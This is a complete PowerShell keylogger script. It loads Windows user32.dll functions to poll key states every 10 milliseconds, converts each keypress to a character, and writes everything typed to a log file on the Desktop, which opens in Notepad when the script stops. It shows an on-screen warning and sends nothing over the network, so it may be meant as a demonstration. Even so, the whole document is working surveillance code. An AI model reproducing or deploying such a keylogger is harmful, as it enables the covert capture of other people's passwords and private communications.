# Signatures for API Calls
$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

# Load signatures and make members available
$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

# Set the path for the log file on the Desktop
$LogFilePath = [Environment]::GetFolderPath('Desktop')+'\testing-log.txt'

# Create the output file
$null = New-Item -Path $LogFilePath -ItemType File -Force

try {
  # Display a message indicating that key presses are being recorded
  Write-Host 'Recording key presses. Press CTRL+C to stop.' -ForegroundColor Red
  
  # Infinite loop to continuously monitor key presses
  while ($true) {
    Start-Sleep -Milliseconds 10
    
    # Scan all ASCII codes above 8
    for ($ascii = 9; $ascii -le 254; $ascii++) {
      $state = $API::GetAsyncKeyState($ascii)

      # Check if the key is pressed
      if ($state -eq -32767) {
        $null = [console]::CapsLock

        # Get virtual key code
        $virtualKey = $API::MapVirtualKey($ascii, 3)

        # Get keyboard state
        $kbstate = New-Object Byte[] 256
        $checkkbstate = $API::GetKeyboardState($kbstate)

        # Create a StringBuilder to store the pressed key
        $mychar = New-Object -TypeName System.Text.StringBuilder

        # Convert the key code to Unicode
        $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

        # If conversion is successful, append the key to the log file
        if ($success) {
          [System.IO.File]::AppendAllText($LogFilePath, $mychar, [System.Text.Encoding]::Unicode)
        }
      }
    }
  }
} finally {
  # Open the log file in Notepad when the loop is interrupted (e.g., by pressing CTRL+C)
  notepad $LogFilePath
}
